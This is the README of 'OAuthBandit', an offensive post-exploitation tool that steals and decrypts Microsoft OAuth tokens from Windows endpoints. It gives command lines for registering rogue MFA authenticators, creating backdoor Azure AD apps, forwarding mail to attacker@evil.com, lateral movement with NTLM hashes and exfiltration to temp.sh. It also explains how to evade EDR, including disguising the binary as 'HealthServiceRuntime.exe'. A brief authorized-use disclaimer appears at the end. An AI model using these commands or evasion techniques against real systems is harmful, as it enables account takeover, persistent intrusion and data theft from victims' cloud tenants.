<p align="center">
  <img src="logo.png" alt="OAuthBandit Logo" width="400"/>
</p>

# OAuthBandit

```
    ╔═╗╔═╗╦ ╦╔╦╗╦ ╦  ╔╗ ╔═╗╔╗╔╔╦╗╦╔╦╗
    ║ ║╠═╣║ ║ ║ ╠═╣  ╠╩╗╠═╣║║║ ║║║ ║
    ╚═╝╩ ╩╚═╝ ╩ ╩ ╩  ╚═╝╩ ╩╝╚╝═╩╝╩ ╩
```

**Microsoft OAuth Token Extraction & Validation Framework**

---

## Overview

### What is OAuthBandit?

OAuthBandit is a **post-exploitation tool** designed for Red Team operations and penetration testing engagements. It automates the extraction, validation, and exploitation of Microsoft OAuth tokens from compromised Windows endpoints.

When a user authenticates to Microsoft 365, Azure, or any Microsoft cloud service, their browser and applications cache **OAuth tokens** locally. These tokens grant access to cloud resources without requiring the user's password. OAuthBandit finds these cached tokens, decrypts them, validates their capabilities, and enables persistence mechanisms.

### Why is this interesting?

In modern enterprise environments, **identity is the new perimeter**. Organizations invest heavily in endpoint security, but OAuth tokens represent a blind spot:

- **Tokens bypass MFA** — Once issued, tokens don't require re-authentication
- **Tokens are cached everywhere** — Browser, Teams, Office, Azure CLI, PowerShell, VS Code
- **Tokens survive password changes** — Refresh tokens remain valid until explicitly revoked
- **Tokens enable cloud access** — From any machine, without VPN or corporate network
- **Tokens are rarely monitored** — Most organizations don't track token usage patterns

### What does it do?

**1. Token Extraction** — Searches 7 different cache locations on the compromised machine, decrypts tokens using DPAPI/AES-GCM/CMS, and extracts access tokens, refresh tokens, and service principal credentials.

**2. Token Validation** — Tests each token against Microsoft APIs to determine:
- Is it still valid? How long until expiration?
- What permissions does it have? (Mail, Files, Directory, Admin roles)
- Can it be exchanged for tokens to other services? (FOCI abuse)
- Does the user have admin privileges? (Global Admin, Security Admin)

**3. Persistence** — Establishes long-term access through:
- **MFA Registration** — Add a rogue TOTP authenticator to the victim's account
- **App Registration** — Create a backdoor Azure AD application with credentials
- **Mail Forwarding** — Silently forward all emails to an external address

**4. Lateral Movement** — Remotely extract tokens from other machines in the domain via SMB/WMI.

### Attack Scenario

```
1. Initial Access     → Phishing, exploit, or insider access to a workstation
2. Token Extraction   → OAuthBandit grabs cached tokens (no admin required)
3. Validation         → Identify high-value tokens (admin accounts, Graph access)
4. FOCI Exchange      → Convert limited tokens to full Graph API access
5. Persistence        → Register MFA device or create backdoor app
6. Cloud Access       → Access M365, Azure, SharePoint from attacker machine
7. Lateral Movement   → Extract tokens from other domain machines
```

### Key Capabilities

| Capability | Description |
|------------|-------------|
| **DPAPI Decryption** | Decrypt TokenBroker cache without user password (current user context) |
| **WAM Extraction** | Extract Web Account Manager tokens (CMS + DPAPI + AES-GCM + Deflate) |
| **FOCI Abuse** | Exchange tokens between Microsoft first-party applications |
| **JWT Analysis** | Parse tokens offline to extract user, roles, scopes, expiration |
| **Admin Detection** | Identify Global Administrators, Security Admins, Privileged Role Admins |
| **MFA Bypass** | Register TOTP authenticator without triggering MFA prompts |
| **TAP Check** | Verify if Temporary Access Pass policy allows persistence |
| **App Backdoor** | Create Azure AD application with client secret for long-term access |

---

## Features

### Token Extraction

The tool automatically searches for tokens in **7 different sources**:

| Source | Location | Encryption |
|--------|----------|------------|
| **TBRes Cache** | `%LOCALAPPDATA%\Microsoft\TokenBroker\Cache\*.tbres` | DPAPI |
| **WAM Cache** | `%LOCALAPPDATA%\Packages\Microsoft.AAD.BrokerPlugin*\AC\TokenBroker\Cache\` | CMS + DPAPI + AES-GCM + Deflate |
| **Azure CLI** | `%USERPROFILE%\.azure\msal_token_cache.json` | Plaintext |
| **Azure PowerShell** | `%USERPROFILE%\.Azure\AzureRmContext.json`, `TokenCache.dat` | DPAPI |
| **MSAL Shared Cache** | `%LOCALAPPDATA%\.IdentityService\mg.msal.cache.*` | Plaintext |
| **VS Code Azure** | `%APPDATA%\Code\User\globalStorage\ms-vscode.azure-account\` | SQLite |
| **Credential Manager** | Windows Credential Manager | DPAPI |

**Extracted token types:**

| Token Type | Description | Use Case |
|------------|-------------|----------|
| **Access Token (AT)** | JWT bearer token for API access | Direct API calls to Microsoft Graph, Azure, etc. |
| **Refresh Token (RT)** | Long-lived token for obtaining new ATs | Token refresh without re-authentication |
| **ID Token** | JWT containing user identity claims | User profile information |
| **NGC Token** | Next Generation Credentials token | Windows Hello / passwordless auth |
| **Service Principal** | `client_id:secret` or certificate | Application-level access |

**Enhanced metadata extraction:**

| Field | Description |
|-------|-------------|
| **Source Type** | `PRT_FILE` (p_* files), `AUTHORITY_FILE` (a_* files), `TBRES` |
| **PRT-Bound** | Indicates if token is bound to Primary Refresh Token |
| **Office Master** | Flags high-value Office 365 master tokens (`d3590ed6-52b3-4102-aeff-aad2292ab01c`) |
| **Session Key** | Extracted session keys from WAM cache |

---

### Token Validation (`--validate`)

Validation analyzes each token and determines:

**For Access Tokens:**
- **Audience** — Target API (Graph, Teams, Outlook, Azure Management, SharePoint, Key Vault)
- **Expiration** — Time remaining or expired since
- **User** — UPN extracted from JWT
- **Azure AD Roles** — Mapping of `wids` GUIDs to readable names
- **Application** — Source app identification (Teams, Office, Edge, etc.)
- **Scopes** — Granted permissions, categorized by domain

**For Refresh Tokens:**
- **FOCI Exchange** — Test with 6 FOCI clients × 3 scopes × 3 tenant endpoints
- **Directory Read** — `User.Read.All` verification
- **Admin Roles** — Admin group detection (Global Admin, Security Admin, etc.)
- **MFA Methods** — Read registered authentication methods
- **TAP Policy** — Check if Temporary Access Pass is enabled
- **App Registration** — Test Azure AD application creation

---

### Post-Exploitation Modules

| Module | Flag | Description |
|--------|------|-------------|
| **MFA Persistence** | `--mfa` | Register TOTP authenticator + check TAP |
| **App Registration** | `--app-reg` | Create Azure AD backdoor with credentials |
| **Mail Redirect** | `--mail-fwd` | Create inbox forwarding rule to external address |
| **Remote Mode** | `DOMAIN/user:pass@IP` | Domain-wide extraction via SMB/WMI |

---

### OPSEC

| Technique | Description |
|-----------|-------------|
| **User-Agent Rotation** | Cycles through Edge, Teams, Firefox, Outlook, Chrome signatures |
| **Request Jitter** | Random 30-150ms delays between API calls |
| **Path Obfuscation** | Cache paths stored as Base64 constants, decoded at runtime |
| **Neutral Metadata** | Assembly signed as "Contoso Ltd" enterprise software, not Microsoft |
| **No LSASS Touch** | Reads file caches only, never touches protected processes |
| **User Context Only** | Runs without elevation, no privilege escalation required |
| **Legitimate Endpoints** | All traffic goes to graph.microsoft.com, login.microsoftonline.com |
| **Standard OAuth Flows** | Token requests identical to real Microsoft apps |
| **No Persistence** | Doesn't install services, scheduled tasks, or registry keys |
| **Clean Exit** | No artifacts left on disk after execution |

---

## Usage

### Local Extraction (default)

```powershell
# Simple extraction
.\HealthServiceRuntime.exe

# Extraction + token validation
.\HealthServiceRuntime.exe --validate

# Extraction + automatic MFA persistence
.\HealthServiceRuntime.exe --mfa
```

### With Manual Token

```powershell
# MFA with refresh token
.\HealthServiceRuntime.exe --mfa --token "1.AV0A..."

# MFA from token file
.\HealthServiceRuntime.exe --mfa --tokenfile tokens.txt

# App registration backdoor
.\HealthServiceRuntime.exe --app-reg --token "1.AV0A..."

# Mail redirect
.\HealthServiceRuntime.exe --mail-fwd attacker@evil.com --token "1.AV0A..."
```

### Remote Mode (Lateral Movement)

```powershell
# With credentials
.\HealthServiceRuntime.exe DOMAIN/admin:pass@10.0.0.1

# With NTLM hash
.\HealthServiceRuntime.exe DOMAIN/admin@10.0.0.1 -hashes :NTHASH

# Remote + MFA batch
.\HealthServiceRuntime.exe DOMAIN/admin:pass@10.0.0.1 --mfa
```

### Exfiltration

```powershell
# Upload to temp.sh
.\HealthServiceRuntime.exe --exfil
```

---

## Options

| Flag | Description |
|------|-------------|
| `--local`, `-l` | Local mode (default) |
| `--validate`, `-v` | Validate tokens + probe capabilities |
| `--mfa` | Register MFA persistence (TOTP + TAP) |
| `--app-reg` | Create Azure AD backdoor |
| `--mail-fwd EMAIL` | Forward all mail to EMAIL |
| `--token RT` | Refresh token value |
| `--tokenfile FILE` | File with refresh tokens (one per line) |
| `--tenant ID` | Tenant ID (default: `common`) |
| `--exfil` | Exfiltrate results to temp.sh |
| `-hashes LM:NT` | NTLM hash for remote auth |
| `-threads N` | Thread count (default: 10) |
| `-retry N` | Retry count per machine (default: 1) |
| `--mfa-delay SEC` | Delay between MFA requests (default: 2.0) |
| `-computer HOST` | Target specific computer(s) |
| `-output`, `-o DIR` | Output directory (default: current) |

---

## Build

**Requirements:** .NET 8 SDK (Windows)

```powershell
# Build
dotnet build -c Release

# Publish executable
dotnet publish -c Release -r win-x64 --self-contained false

# Output: bin/Release/net8.0-windows/win-x64/publish/HealthServiceRuntime.exe
```

## Output

Tokens are exported as structured JSON in `./export/`:

```
export/
├── grab_{hostname}_{date}.json     # All extracted tokens
├── mfa_{hostname}_{date}.json      # MFA registration results
└── appreg_{hostname}_{date}.json   # App registration results
```

### Validation Output Example

```
  # token validation + capability check
    7 token(s) with Graph audience found
    testing 10 unique tokens...

    + Microsoft Teams (access_token)
      audience: Graph API
      user: user@contoso.com
      roles: Directory Readers
      expiry: valid for 52m
      app: Microsoft Teams
      profile: John Doe <user@contoso.com>
      permissions: 27 scopes granted:
        mail: email, Mail, Mail (+1)
        calendar: Calendars, Calendars (+1)
        files: Files, FileStorageContainer
        user: User
        teams: Channel, ChatMessage, Team (+2)

    + Microsoft (Other) (az) (refresh_token)
      user: admin@contoso.com
      exchange: OK via original (graph)
      identity: Admin User <admin@contoso.com>
      directory: readable (User.Read.All)
      admin_roles: Global Administrator, Security Admin
      mfa_methods: readable (totp reg possible)
      tap_policy: enabled
      app_registration: allowed

  ~ validation: 10 valid, 0 failed out of 10
```

---

## Architecture

```
OAuthBandit/
├── Program.cs                    # CLI entry point
├── Core/
│   ├── Engine.cs                 # Orchestrator (local/remote/mfa/app-reg/mail-fwd)
│   ├── Models.cs                 # Data models (Token, ValidationResult)
│   ├── Constants.cs              # Patterns, app IDs, encoded paths
│   ├── OutputManager.cs          # Stats display + JSON export
│   └── TokenValidator.cs         # Validation + capability probing
├── Extractors/
│   ├── BaseExtractor.cs          # JWT parsing, app identification
│   ├── TBResExtractor.cs         # TokenBroker .tbres extraction
│   ├── WAMExtractor.cs           # Web Account Manager extraction
│   └── AzureCliExtractor.cs      # Az CLI/PS/VSCode/CredManager
├── Crypto/
│   └── CryptoUtils.cs            # DPAPI, AES-GCM, CMS decryption
├── Mfa/
│   ├── MfaManager.cs             # TOTP + TAP registration
│   ├── TokenExchange.cs          # FOCI exchange service
│   ├── GraphClient.cs            # Graph API client
│   ├── AppRegister.cs            # Azure AD app registration
│   └── MailRedirect.cs           # Inbox rule creation
├── Remote/
│   └── RemoteExecutor.cs         # SMB/WMI lateral movement
└── Utils/
    └── EncodingUtils.cs          # Base32, GUID formatting
```

---

## Supported Audiences

| Audience | API | Probing |
|----------|-----|---------|
| `graph.microsoft.com` | Microsoft Graph | Profile, Categorized permissions |
| `outlook.office365.com` | Outlook API | Profile, Scopes |
| `management.azure.com` | Azure ARM | Subscriptions, Resource Groups |
| `vault.azure.net` | Key Vault | Vaults, Secrets listing |
| `*.sharepoint.com` | SharePoint | Sites, Drives |
| `api.spaces.skype.com` | Teams API | Scopes |

---

## Why EDRs Don't Detect This

OAuthBandit operates entirely within **legitimate Windows behavior patterns**. Here's why the disk operations and decryption are invisible to EDRs:

### Disk Operations

| Operation | Why It's Not Detected |
|-----------|----------------------|
| **Reading .tbres files** | Any app can read files in `%LOCALAPPDATA%`. Teams, Office, Edge do this constantly. No file system hooks trigger on user-owned cache files. |
| **Reading WAM cache** | Same as above. The AAD BrokerPlugin folder is accessed by dozens of Microsoft processes daily. |
| **File enumeration** | `Directory.GetFiles()` is a standard .NET call. EDRs don't flag directory listings in user folders. |

### Decryption Operations

| Operation | Why It's Not Detected |
|-----------|----------------------|
| **DPAPI CryptUnprotectData** | This is the **official Windows API** for decrypting user data. Every browser, password manager, and Microsoft app uses it. EDRs cannot block it without breaking Windows. |
| **AES-GCM decryption** | Standard cryptographic operation. The key comes from DPAPI, so it's just math on bytes - no suspicious API calls. |
| **CMS envelope parsing** | ASN.1 parsing is pure data manipulation. No system calls, no hooks, nothing to detect. |
| **Deflate decompression** | `System.IO.Compression` is a standard .NET library. Used by every app that handles compressed data. |

### Why DPAPI Is The Key

DPAPI (`CryptUnprotectData`) is designed to let applications decrypt data **without knowing the key**. Windows handles the key derivation internally using the user's credentials.

```
User logs in → Windows derives DPAPI master key → Any process in user context can decrypt
```

This means:
- **No credential theft** - We never touch LSASS or SAM
- **No key extraction** - The key stays in Windows kernel memory
- **No privilege escalation** - Works as standard user
- **No API hooking** - We call the official documented API

EDRs **cannot distinguish** between:
- Teams decrypting its own token cache
- OAuthBandit decrypting the same cache

Both use the exact same API call with the exact same parameters.

### Token Validation (Network)

When we validate tokens against Microsoft APIs:

| Aspect | Why It's Not Detected |
|--------|----------------------|
| **Destination** | `graph.microsoft.com`, `login.microsoftonline.com` - legitimate Microsoft endpoints |
| **Protocol** | Standard HTTPS on port 443 |
| **Request format** | Identical to real Microsoft apps (same headers, same OAuth flows) |
| **User-Agent** | Rotates through real browser/app signatures |
| **Timing** | Random delays between requests (30-150ms jitter) |

> **Note:** Aggressive usage (mass extraction, rapid API calls) may trigger behavioral analytics. Use appropriate delays during engagements.

---

## Credits

This project builds upon the research and tools of:

| Project | Author | Contribution |
|---------|--------|--------------|
| **WAMBam** | Adam Chester ([@_xpn_](https://twitter.com/_xpn_)) | WAM token extraction research |
| **ROADtools** | Dirk-jan Mollema ([@_dirkjan](https://twitter.com/_dirkjan)) | Azure AD internals, token analysis |
| **SpecterBroker** | R3alM0m1X82 | TokenBroker extraction, NGC token patterns, PRT-Bound detection, Office Master token identification, SourceType classification |

Special thanks to the security research community for their continuous work on Azure AD and Microsoft 365 security.

---

## Disclaimer

This tool is intended for authorized security testing and research only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before using this tool.

---

## License

MIT License

Copyright (c) 2026

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
